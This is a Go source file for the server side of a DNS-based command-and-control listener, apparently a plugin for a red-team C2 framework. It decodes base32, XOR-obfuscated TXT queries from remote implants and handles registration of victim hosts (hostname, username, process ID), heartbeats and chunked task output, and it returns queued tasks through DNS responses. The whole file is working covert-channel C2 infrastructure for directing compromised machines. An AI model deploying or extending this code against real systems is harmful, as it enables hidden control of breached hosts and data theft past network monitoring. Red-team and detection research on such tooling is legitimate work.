package main

import (
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"

	"github.com/miekg/dns"
)

// ============================================================
// Protocol constants
// ============================================================

const (
	MsgRegister  = byte(0x01)
	MsgHeartbeat = byte(0x02)
	MsgOutput    = byte(0x03)
	MsgBofOut    = byte(0x04)

	RespIdle     = byte(0x00)
	RespRegAck   = byte(0x01)
	RespTasks    = byte(0x02)
	RespContinue = byte(0x03)
)

// base32 codec: standard alphabet, no padding, uppercase input/output
var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)

// ============================================================
// Key derivation and encryption
// ============================================================

// deriveKey derives a 4-byte XOR key from an 8-character lowercase hex agentId.
// e.g. "deadc0de" → [0xde, 0xad, 0xc0, 0xde]
func deriveKey(agentId string) []byte {
	key := make([]byte, 4)
	for i := 0; i < 4; i++ {
		b, _ := strconv.ParseUint(agentId[i*2:i*2+2], 16, 8)
		key[i] = byte(b)
	}
	return key
}

// xorCrypt XORs data against a repeating key.
func xorCrypt(data []byte, key []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

// ============================================================
// DNSServer
// ============================================================

// pendingOutput buffers a multi-chunk MSG_OUTPUT reassembly for one agent task.
type pendingOutput struct {
	taskID   string
	status   byte
	total    uint32
	received uint32
	buf      []byte // full reassembled payload: [tid:8][status:1][total:4][data:total]
}

type DNSServer struct {
	host         string
	port         int
	domain       string
	listenerName string
	udpServer    *dns.Server
	tcpServer    *dns.Server
	mu           sync.Mutex
	pendingOut   sync.Map // agentId → *pendingOutput
}

// NewDNSServer constructs a DNSServer but does not start it.
func NewDNSServer(host string, port int, domain string, listenerName string) *DNSServer {
	return &DNSServer{
		host:         host,
		port:         port,
		domain:       domain,
		listenerName: listenerName,
	}
}

// Start registers the DNS handler and launches UDP and TCP servers.
func (s *DNSServer) Start() error {
	mux := dns.NewServeMux()
	pattern := s.domain + "."
	mux.HandleFunc(pattern, s.handleDNS)

	addr := net.JoinHostPort(s.host, strconv.Itoa(s.port))

	s.mu.Lock()
	s.udpServer = &dns.Server{
		Addr:    addr,
		Net:     "udp",
		Handler: mux,
	}
	s.tcpServer = &dns.Server{
		Addr:    addr,
		Net:     "tcp",
		Handler: mux,
	}
	s.mu.Unlock()

	udpReady := make(chan error, 1)
	tcpReady := make(chan error, 1)

	go func() {
		if err := s.udpServer.ListenAndServe(); err != nil {
			udpReady <- err
		}
	}()

	go func() {
		if err := s.tcpServer.ListenAndServe(); err != nil {
			tcpReady <- err
		}
	}()

	// Give the servers a moment to bind; surface any immediate bind errors.
	select {
	case err := <-udpReady:
		return fmt.Errorf("BeaconDNS UDP server error: %w", err)
	case err := <-tcpReady:
		return fmt.Errorf("BeaconDNS TCP server error: %w", err)
	default:
		// Both servers started without an immediate error.
	}

	return nil
}

// Stop shuts down both DNS servers.
func (s *DNSServer) Stop() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	var udpErr, tcpErr error
	if s.udpServer != nil {
		udpErr = s.udpServer.Shutdown()
		s.udpServer = nil
	}
	if s.tcpServer != nil {
		tcpErr = s.tcpServer.Shutdown()
		s.tcpServer = nil
	}

	if udpErr != nil {
		return udpErr
	}
	return tcpErr
}

// ============================================================
// DNS query handler
// ============================================================

func (s *DNSServer) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	for _, q := range r.Question {
		if q.Qtype != dns.TypeTXT {
			// Ignore non-TXT queries silently.
			continue
		}

		txtData := s.processQuery(q.Name, w.RemoteAddr().String())

		if txtData == "" {
			// Build idle response even on decode failure.
			txtData = s.buildEmptyResponse()
		}

		rr := &dns.TXT{
			Hdr: dns.RR_Header{
				Name:   q.Name,
				Rrtype: dns.TypeTXT,
				Class:  dns.ClassINET,
				Ttl:    0,
			},
			Txt: []string{txtData},
		}
		m.Answer = append(m.Answer, rr)
	}

	_ = w.WriteMsg(m)
}

// processQuery decodes an incoming DNS label, dispatches to the appropriate
// message handler, and returns a base32-encoded, XOR-encrypted response string.
func (s *DNSServer) processQuery(qname string, remoteAddr string) string {
	domain := s.domain

	// Strip trailing dot from domain suffix for comparison.
	suffix := "." + domain + "."

	// q.Name already has a trailing dot (FQDN).
	if !strings.HasSuffix(qname, suffix) {
		return ""
	}

	// e.g. "AAAA.BBBB.deadc0de.c2.lab." → "AAAA.BBBB.deadc0de"
	trimmed := strings.TrimSuffix(qname, suffix)

	parts := strings.Split(trimmed, ".")
	if len(parts) < 1 {
		return ""
	}

	// Last part is agentId; everything before it is encoded data.
	agentId := strings.ToLower(parts[len(parts)-1])
	dataLabels := parts[:len(parts)-1]

	// Validate agentId: must be exactly 8 hex chars.
	if len(agentId) != 8 {
		return ""
	}
	for _, c := range agentId {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
			return ""
		}
	}

	key := deriveKey(agentId)

	// Concatenate data labels, uppercase, base32 decode.
	var decoded []byte
	if len(dataLabels) > 0 {
		encoded := strings.ToUpper(strings.Join(dataLabels, ""))
		var err error
		decoded, err = b32.DecodeString(encoded)
		if err != nil {
			// Treat decode failure as a heartbeat.
			decoded = nil
		}
	}

	// Decrypt if we have data.
	if len(decoded) > 0 {
		decoded = xorCrypt(decoded, key)
	}

	// Extract remote IP (strip port).
	remoteIP, _, err := net.SplitHostPort(remoteAddr)
	if err != nil {
		remoteIP = remoteAddr
	}

	// Dispatch based on message type.
	var response []byte

	if len(decoded) < 1 {
		// Empty query → treat as heartbeat.
		response = s.handleHeartbeat(agentId)
	} else {
		msgType := decoded[0]
		switch msgType {
		case MsgRegister:
			response = s.handleRegister(agentId, decoded, remoteIP)
		case MsgHeartbeat:
			response = s.handleHeartbeat(agentId)
		case MsgOutput, MsgBofOut:
			response = s.handleOutput(agentId, decoded)
		default:
			response = s.idleResponse()
		}
	}

	if len(response) == 0 {
		response = s.idleResponse()
	}

	// Encrypt response and base32-encode.
	encrypted := xorCrypt(response, key)
	return b32.EncodeToString(encrypted)
}

// ============================================================
// Message handlers
// ============================================================

// handleRegister processes a MsgRegister (0x01) packet and returns the
// response bytes (before encryption).
//
// Packet layout (after XOR decrypt):
//   decoded[0]    = 0x01  (msg_type)
//   decoded[1]    = seq
//   decoded[2..3] = data_len (LE uint16)
//   decoded[4:]   = registration payload
//
// Registration payload:
//   [1] hostname_len
//   [N] hostname bytes
//   [1] username_len
//   [N] username bytes
//   [4] pid        (LE uint32)
//   [1] arch       (1=x64, 2=x86)
//   [1] os_major
//   [1] os_minor
//   [4] sleep_ms   (LE uint32)
//   [1] jitter_pct
func (s *DNSServer) handleRegister(agentId string, decoded []byte, remoteIP string) []byte {
	if len(decoded) < 4 {
		return s.idleResponse()
	}

	if Ts.TsAgentIsExists(agentId) {
		return s.regAckResponse()
	}

	payload := decoded[4:]

	_, err := Ts.TsAgentCreate("dns00001", agentId, payload, s.listenerName, remoteIP, false)
	if err != nil {
		return s.regAckResponse()
	}

	return s.regAckResponse()
}

// handleHeartbeat processes a MsgHeartbeat (0x02) or empty query and returns
// the appropriate response bytes (before encryption).
func (s *DNSServer) handleHeartbeat(agentId string) []byte {
	Ts.TsAgentSetTick(agentId, s.listenerName)

	taskBytes, err := Ts.TsAgentGetHostedTasks(agentId, 1024)
	if err != nil || len(taskBytes) == 0 {
		return s.idleResponse()
	}

	return s.tasksResponse(taskBytes)
}

// handleOutput processes a MsgOutput (0x03) or MsgBofOut (0x04) packet.
// Reassembles multi-chunk output: seq==0 carries the full header and first
// data bytes; seq>0 carries continuation bytes.  When all bytes of a task's
// output have been received the complete record is forwarded to ProcessData.
func (s *DNSServer) handleOutput(agentId string, decoded []byte) []byte {
	if len(decoded) < 4 {
		return s.idleResponse()
	}
	seq := decoded[1]
	payload := decoded[4:]

	if seq == 0 {
		// Discard any leftover incomplete reassembly for this agent.
		s.pendingOut.Delete(agentId)

		if len(payload) < 13 {
			return s.idleResponse()
		}
		taskID := string(payload[0:8])
		status := payload[8]
		total := binary.LittleEndian.Uint32(payload[9:13])
		data := payload[13:]

		if total <= uint32(len(data)) {
			// Entire output fits in this one chunk — forward directly.
			_ = Ts.TsAgentProcessData(agentId, payload[:13+int(total)])
		} else {
			// First chunk of a multi-part output — start buffering.
			full := make([]byte, 13+int(total))
			copy(full[0:8], []byte(taskID))
			full[8] = status
			binary.LittleEndian.PutUint32(full[9:13], total)
			n := copy(full[13:], data)
			s.pendingOut.Store(agentId, &pendingOutput{
				taskID:   taskID,
				status:   status,
				total:    total,
				received: uint32(n),
				buf:      full,
			})
		}
	} else {
		// Continuation chunk — append to buffered reassembly.
		if v, ok := s.pendingOut.Load(agentId); ok {
			po := v.(*pendingOutput)
			remaining := po.total - po.received
			n := uint32(copy(po.buf[13+po.received:13+po.total], payload))
			if n > remaining {
				n = remaining
			}
			po.received += n
			if po.received >= po.total {
				_ = Ts.TsAgentProcessData(agentId, po.buf)
				s.pendingOut.Delete(agentId)
			}
		}
	}
	return s.idleResponse()
}

// ============================================================
// Response builders
// ============================================================

// idleResponse builds a RESP_IDLE frame: [0x00][0x00][0x00]
func (s *DNSServer) idleResponse() []byte {
	return []byte{RespIdle, 0x00, 0x00}
}

// regAckResponse builds a RESP_REG_ACK frame: [0x01][0x00][0x00]
func (s *DNSServer) regAckResponse() []byte {
	return []byte{RespRegAck, 0x00, 0x00}
}

// tasksResponse builds a RESP_TASKS frame:
//
//	[0x02][len_lo][len_hi][taskBytes...]
func (s *DNSServer) tasksResponse(taskBytes []byte) []byte {
	resp := make([]byte, 3+len(taskBytes))
	resp[0] = RespTasks
	binary.LittleEndian.PutUint16(resp[1:3], uint16(len(taskBytes)))
	copy(resp[3:], taskBytes)
	return resp
}

// buildEmptyResponse returns an idle response string as base32 with a zero key
// (used when we cannot determine the agentId). This is a safe fallback.
func (s *DNSServer) buildEmptyResponse() string {
	// Encode idle bytes with a null key — the agent will either ignore or retry.
	idle := s.idleResponse()
	return b32.EncodeToString(idle)
}
